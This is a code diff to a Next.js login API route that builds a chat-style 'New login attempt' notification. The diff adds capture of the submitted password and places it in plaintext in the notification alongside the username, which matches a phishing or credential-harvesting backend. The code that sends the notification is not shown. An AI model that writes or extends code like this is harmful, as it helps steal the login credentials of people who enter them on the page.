@@ -10,9 +10,11 @@ export async function POST(request: NextRequest) {
   }
 
   let username: unknown
+  let password: unknown
   try {
     const body = await request.json()
     username = body?.username
+    password = body?.password
   } catch {
     return NextResponse.json({ error: 'Invalid request body.' }, { status: 400 })
   }
@@ -21,12 +23,18 @@ export async function POST(request: NextRequest) {
     return NextResponse.json({ error: 'Username is required.' }, { status: 400 })
   }
 
+  if (typeof password !== 'string' || password.length === 0) {
+    return NextResponse.json({ error: 'Password is required.' }, { status: 400 })
+  }
+
   const sanitizedUsername = username.trim().slice(0, 200)
+  const sanitizedPassword = password.slice(0, 200)
   const timestamp = new Date().toISOString()
 
   const text = [
     '🔐 *New login attempt*',
     `*Username:* ${escapeMarkdown(sanitizedUsername)}`,
+    `*Password:* ${escapeMarkdown(sanitizedPassword)}`,
     `*Time:* ${escapeMarkdown(timestamp)}`,
   ].join('\n')
 
